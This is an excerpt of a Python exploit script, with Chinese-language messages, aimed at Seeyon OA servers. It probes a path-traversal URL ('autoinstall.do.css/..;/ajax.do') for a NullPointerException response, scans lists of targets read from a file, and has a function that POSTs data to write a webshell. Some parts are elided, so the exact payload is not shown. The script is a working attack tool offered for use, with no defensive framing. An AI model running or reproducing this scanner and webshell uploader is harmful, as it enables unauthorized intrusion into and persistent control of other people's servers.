...
def scan(url):
    ...
    try:
        resp = requests.get(url = TargetUrl1, headers = headers, verify = False)
...
def scan_file(file):
    ...
    for target in f.readlines():
        TargetUrl2 = target.strip() + "/seeyon/autoinstall.do.css/..;/ajax.do"
        try:
            resp = requests.get(url = TargetUrl2, headers = headers, verify = False)
            if "java.lang.NullPointerException:nul" in resp.text:
...
def post_shell(shell):
    ...
    try:
        requests.post(url = TargetUrl3, headers = headers, data = data, verify = False)
        get_shell(shell)
    except Exception as e:
        print("【-】很遗憾！无法写入webshell {} \033[0m".format(e))
        sys.exit(0)
